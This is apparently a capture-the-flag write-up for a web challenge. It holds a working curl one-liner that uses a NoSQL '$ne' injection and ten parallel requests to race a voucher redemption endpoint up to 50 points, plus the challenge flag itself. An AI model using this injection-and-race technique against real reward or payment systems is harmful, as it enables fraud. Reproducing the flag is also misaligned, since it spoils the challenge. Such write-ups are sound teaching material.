

# Fast Track – Web Exploitation

## Flag

```
citadel{ak1ra_w4it5_f0r_y0u_4t_n1te}
```


The challenge runs a voucher redemption system where each voucher gives 5 points. You need 50 points to buy the secret item containing the flag.


### payload

```bash
curl -s -c /tmp/c.txt -H "Content-Type: application/json" -d "{\"username\":\"u$RANDOM\",\"password\":\"pass123\"}" http://chall_citadel.cryptonitemit.in:62014/register-user && for i in {1..10}; do curl -s -b /tmp/c.txt -G --data-urlencode "discountCode[\$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem & done; wait && curl -s -b /tmp/c.txt -H "Content-Type: application/json" -d '{"productId":4}' http://chall_citadel.cryptonitemit.in:62014/store | grep -o 'citadel{[^"]*}'
```

Registers user, exploits race condition with 10 parallel NoSQL-injected requests to accumulate 50 points, purchases flag is the intended soln but 

i got the flag by sending 10 requests by exploiting abv mentioned vuln.

NoSQL Injection `$ne` operator to Bypass  validation
 race con : 10 parallel requests during 2s delay which Multiply rewards from 5 to 50 points
Purchase product ID 4 at last to Get the flag
